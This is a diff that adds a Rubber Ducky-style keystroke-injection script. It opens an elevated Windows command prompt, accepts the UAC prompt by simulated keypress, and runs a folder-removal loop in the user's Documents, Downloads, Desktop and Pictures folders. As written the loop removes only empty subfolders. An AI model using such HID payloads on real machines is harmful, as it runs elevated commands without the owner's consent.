@@ -1,0 +1,37 @@
+DELAY 1000
+GUI r
+DELAY 2000
+STRING cmd
+DELAY 3000
+CTRL SHIFT ENTER
+DELAY 5000
+ALT y
+DELAY 3000
+BACKSPACE
+DELAY 100
+STRING cd %USERPROFILE%/Documents
+ENTER
+DELAY 200
+STRING for /f "delims=" %i in ('dir /s /b /ad ^| sort /r') do rd "%i" 2>NUL
+ENTER
+DELAY 10000
+STRING cd %USERPROFILE%/Downloads
+ENTER
+DELAY 200
+STRING for /f "delims=" %i in ('dir /s /b /ad ^| sort /r') do rd "%i" 2>NUL
+ENTER
+DELAY 10000
+STRING cd %USERPROFILE%/Desktop
+ENTER
+DELAY 200
+STRING for /f "delims=" %i in ('dir /s /b /ad ^| sort /r') do rd "%i" 2>NUL
+ENTER
+DELAY 10000
+STRING cd %USERPROFILE%/Pictures
+ENTER
+DELAY 200
+STRING for /f "delims=" %i in ('dir /s /b /ad ^| sort /r') do rd "%i" 2>NUL
+ENTER
+DELAY 10000
+STRING exit
+ENTER
